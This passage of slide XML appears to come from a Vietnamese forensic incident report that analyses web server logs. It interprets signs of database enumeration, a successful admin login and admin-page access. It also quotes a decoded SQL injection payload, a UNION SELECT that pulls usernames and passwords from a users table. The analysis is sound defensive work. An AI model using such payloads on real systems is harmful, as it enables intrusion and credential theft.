                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="149955"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="479" name="Google Shape;479;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="3773100"/>
            <a:ext cx="10622100" cy="2446800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Phân tích: Các đặc điểm quan trọng: </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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Sử dụng UNION SELECT:  Cho thấy đối tượng đang: Đang cố kết hợp dữ liệu mới vào kết quả truy vấn không phải hành vi người dùng hợp lệ</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Hàm database(): lấy tên database hiện tại =&gt; Đối tượng đang cố thu thập thông tin cấu trúc DSMS</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Dùng comment SQL: -- -: Cắt phần còn lại của câu SQL =&gt; Đây là mẫu rất đặc trưng của khai thác SQL Injection</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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Nhận định: Có dấu hiệu: </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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Truy vấn trái phép dữ liệu hệ quản trị CSDL</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Enumeration database schema/environment</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="480" name="Google Shape;480;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.3.1. Chi tiết - Phân tích Web Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="481" name="Google Shape;481;p44"/>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82" name="Google Shape;482;p44" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381003" y="3715863"/>
            <a:ext cx="200025" cy="2638375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="483" name="Google Shape;483;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dấu hiệu enumeration database: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="484" name="Google Shape;484;p44" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="485" name="Google Shape;485;p44"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371650" y="2638413"/>
            <a:ext cx="8553450" cy="6953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489"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="490" name="Google Shape;490;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="8475300" cy="11211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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Dấu vết: </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Decode: ' UNION SELECT 1,username,password,4 FROM users -- - </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="149955"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="491" name="Google Shape;491;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="3773100"/>
            <a:ext cx="10622100" cy="2523900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Phân tích: </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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Request này cho thấy đối tượng</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Đã biết sự tồn tại của bảng: users</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Đang cố truy xuất: username, password</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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Ý nghĩa điều tra:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Đây không còn là reconnaissance đơn thuần.</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Đã có dấu hiệu:</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Truy cập trái phép dữ liệu xác thực</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Khả năng lộ tài khoản hệ thống.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="492" name="Google Shape;492;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.3.1. Chi tiết - Phân tích Web Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="Google Shape;493;p45"/>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94" name="Google Shape;494;p45" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381003" y="3715863"/>
            <a:ext cx="200025" cy="2638375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="495" name="Google Shape;495;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dấu hiệu truy vấn dữ liệu nhạy cảm: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="496" name="Google Shape;496;p45" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="497" name="Google Shape;497;p45"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066798" y="2583625"/>
            <a:ext cx="9236274" cy="67096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501"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="502" name="Google Shape;502;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="8475300" cy="1770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1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Dấu vết: </a:t>
            </a:r>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="503" name="Google Shape;503;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="3773100"/>
            <a:ext cx="10622100" cy="2650500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Phân tích: </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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Bước 1: GET /login.php =&gt; Đối tượng truy cập trang đăng nhập</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Bước 2: POST /login.php HTTP/1.1” 302 =&gt; Mã phản hồi: 302 Redirect =&gt; Trong web authentication: 302 thường xuất hiện sau đăng nhập thành công</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Bước 3: GET /admin.php HTTP/1.1” 200 =&gt; Server trả về: 200 OK =&gt; Điều này cho thấy: đối tượng đã truy cập được khu vực quản trị</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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Ý nghĩa điều tra:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Thông tin xác thực đã bị lộ</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Tài khoản bị sử dụng để đăng nhập</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Truy cập trái phép khu vực admin đã xảy ra.  </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="504" name="Google Shape;504;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.3.1. Chi tiết - Phân tích Web Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="505" name="Google Shape;505;p46"/>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506" name="Google Shape;506;p46" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
